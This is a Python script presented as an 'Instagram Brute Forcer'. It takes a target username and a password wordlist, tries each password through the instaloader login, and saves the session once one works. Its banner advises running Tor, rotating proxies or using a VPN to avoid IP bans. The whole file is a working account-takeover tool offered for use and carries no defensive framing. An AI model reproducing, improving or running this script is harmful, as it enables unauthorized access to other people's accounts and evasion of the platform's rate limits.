import instaloader
import time
import os
import sys

# Terminal colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
BOLD = '\033[1m'
RESET = '\033[0m'

def print_logo():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{CYAN}{BOLD}
██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗    
██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝    
██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██████╔╝███████║██║     █████╔╝     
██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██╔══██╗██╔══██║██║     ██╔═██╗     
██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗    
╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    
{YELLOW}
     Instagram Brute Forcer | Coded by Aayush-x-Xwd
     GitHub: https://github.com/Aayush-x-Xwd
     Follow Instructions Below For Best Results:
{RESET}{CYAN}
 ┌────────────────────────────────────────────────────────────┐
 │ Run TOR in another session to rotate IPs                  │
 │ Use proxy rotation or a strong VPN                        │
 │ Avoid retrying too often from a single device             │
 └────────────────────────────────────────────────────────────┘
{RESET}""")

def delay_with_countdown(seconds, message):
    for i in range(seconds, 0, -1):
        sys.stdout.write(f"\r{YELLOW}[!] {message} Retrying in {i} seconds...{RESET} ")
        sys.stdout.flush()
        time.sleep(1)
    print()

def insta_brute_force(username, file_path):
    loader = instaloader.Instaloader()

    try:
        with open(file_path, "r") as file:
            passwords = file.readlines()

        for password in passwords:
            password = password.strip()
            print(f"{CYAN}[~] Trying password: {password}{RESET}")
            try:
                loader.login(username, password)
                print(f"{GREEN}\n[✔] Password found: {password}{RESET}")
                loader.save_session_to_file()
                print(f"""{GREEN}
 ┌───────────────────────────────────────┐
 │  Access Granted — Session Saved!     │
 │  Enjoy your session responsibly.     │
 └───────────────────────────────────────┘
{RESET}""")
                return
            except instaloader.exceptions.BadCredentialsException:
                print(f"{RED}[X] Incorrect password: {password}{RESET}")
            except instaloader.exceptions.TwoFactorAuthRequiredException:
                print(f"{RED}[!] 2FA required! Can't proceed further.{RESET}")
                return
            except instaloader.exceptions.ConnectionException:
                delay_with_countdown(30, "Connection error!")
            except Exception as e:
                print(f"{RED}[!] Unexpected error: {e}{RESET}")
                delay_with_countdown(10, "Waiting to avoid IP ban")

        print(f"""{RED}
 ┌────────────────────────────────────┐
 │  [-] No valid password was found. │
 └────────────────────────────────────┘
{RESET}""")

    except FileNotFoundError:
        print(f"{RED}[!] File not found. Please check the path.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")

if __name__ == "__main__":
    print_logo()
    username = input(f"{CYAN}Enter the target Instagram username: {RESET}")
    file_path = input(f"{CYAN}Enter the path to your password file: {RESET}")
    insta_brute_force(username, file_path)
